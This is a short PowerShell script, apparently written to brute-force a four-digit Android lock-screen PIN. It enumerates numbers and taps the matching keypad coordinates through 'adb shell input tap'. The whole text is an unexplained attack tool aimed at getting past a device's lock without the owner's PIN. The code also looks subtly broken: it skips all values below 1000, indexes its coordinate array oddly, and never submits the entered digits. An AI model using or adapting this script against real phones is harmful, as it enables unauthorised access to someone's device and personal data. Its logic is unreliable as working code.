$Range = @((550,1700), (180,800), (600,800), (900,800), (180,1100), (600,1100), (900,1100), (200,1500), (600,1500), (900,1500))


foreach ($int in 0000..9999){
$str = $int.ToString()

    if ($str.length -ge 4){

        $str = $str.Insert(1,'-')
        $str = $str.Insert(3,'-')
        $str = $str.Insert(5,'-')
    
        $str = $str -split '-'

        for($i=0; $i -le 3; $i++){
            $Num = [int]::Parse($str[$i])
            #Start-Sleep -Milliseconds 200

            $Command = $Range["$Num"] 
            $Command = $Command.Toint32($Null) -join ' '
            Write-Host "Trying $Num"
            adb.exe shell input tap "$Command"
        }
    }
}
